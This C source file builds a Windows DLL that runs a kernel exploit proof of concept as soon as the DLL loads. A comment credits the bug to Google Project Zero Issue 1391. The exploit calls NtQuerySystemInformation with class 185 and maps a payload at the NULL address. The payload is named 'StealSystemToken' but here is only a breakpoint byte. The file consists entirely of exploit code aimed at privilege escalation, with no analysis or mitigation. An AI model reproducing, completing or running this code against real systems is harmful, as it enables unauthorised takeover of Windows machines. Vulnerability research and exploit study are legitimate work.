#include <windows.h>
#include <winternl.h>

const CHAR StealSystemToken[2] = "\xcc";

VOID Exploit()
{
	/**
	* The POC code is from Google Project-Zero Issue 1391.
	* The bug was reported by Matthew "j00ru" Jurczyk.
	*/
	BYTE Buffer[8];
	DWORD BytesReturned;

	RtlZeroMemory(Buffer, sizeof(Buffer));
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned);

	RtlCopyMemory(NULL, StealSystemToken, 1);

	RtlZeroMemory(Buffer, sizeof(Buffer));
	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned);
}

__declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call) {
		case DLL_PROCESS_ATTACH:
			Exploit();
			break;
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}
